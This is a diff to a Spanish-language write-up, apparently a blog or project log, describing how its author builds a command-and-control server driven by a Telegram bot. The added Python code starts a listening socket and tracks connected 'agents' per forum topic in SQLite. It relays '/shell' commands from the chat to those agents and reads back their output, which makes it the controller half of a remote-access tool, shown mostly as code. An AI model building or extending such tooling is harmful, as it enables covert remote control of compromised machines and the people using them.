@@ -284,6 +284,21 @@ class C2Server:
  Despues fui desarrollando lo que sería una base mas solida y ordenada de el sistema
 
 ```python
+if __name__ == "__main__":
+    try:
+        c2 = C2Server()
+        bot.message_handler(func=lambda message: True)(c2.handle_command)
+        threading.Thread(target=c2.start_server, daemon=True).start()
+        bot.polling()
+    except Exception as e:
+        print(colored(f"[!] Error: {e}", 'red'))
+```
+
+Esto es lo que controla el *flujo del servidor* y como veis primero instancia la clase del servidor,luego al message_handler del bot le assigna la función *handle_command* para que cuando reciba un mensaje lo pueda processar y analizar
+
+---
+
+```python
     def start_server(self):
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -303,6 +318,78 @@ class C2Server:
 ```
 
 Esta sería la función que se encarga de iniciar el servidor y de ponerse en espera de conexiones, a parte envia un mensaje al canal general del grupo para informar de que se ha iniciado
+
+---
+
+```python
+    def handle_command(self, message):
+
+        if message.message_thread_id is None:
+            self.handle_global_command(message)
+            return
+
+        conn = sqlite3.connect("agents.db")
+        cursor = conn.cursor()
+        cursor.execute("SELECT ip FROM clients WHERE topic_id = ?", (message.message_thread_id,))
+        client = cursor.fetchone()
+        conn.close()
+        
+        if not client:
+            return
+        
+        client_ip = client[0]
+        text = message.text.lower()
+
+        if text == "/status":
+            self.check_bot_status(client_ip, message.message_thread_id)
+            return
+
+        elif text.startswith("/shell"):
+            command = text.replace("/shell ", "")
+            self.send_command_to_client(self.clients[client_ip], command, message.message_thread_id)
+
+        elif text == "/delete":
+            bot.delete_forum_topic(C2_CHANNEL_ID, message.message_thread_id)
+```
+
+Esta función es la encargada de *analizar el mensaje* que se ha enviado por el grupo y si es algun comando ejecuta la debida función
+
+---
+
+```python
+    def send_command_to_client(self, client_socket, command, topic_id):
+        try:
+            client_socket.socket.send(command)
+            
+            response = self.recv_all(client_socket.socket).strip()
+
+        except Exception as e:
+            bot.send_message(C2_CHANNEL_ID, f"❌ Error executing the command: {e}", message_thread_id=topic_id)
+```
+
+Esta función se encarga de enviar el comando a el agente y esperar una respuesta
+
+Aquí ya se podría a empezar a aplicar condicionales para tratar diferente las respuestas en base si son un archivo o una imagen
+
+---
+
+```python
+def recv_all(self, sock):
+    try:
+        total_size = int(sock.recv(10).decode().strip())
+        data = b""
+        while len(data) < total_size:
+            data += sock.recv(min(4096, total_size - len(data)))
+        return data
+    except:
+        return b""
+```
+
+Esta ultima función es la que se encarga de recivir los datos de la respuesta del agente
+
+### Esta sería la base inicial de el C2 
+
+---
 
 ## Próximos pasos
 
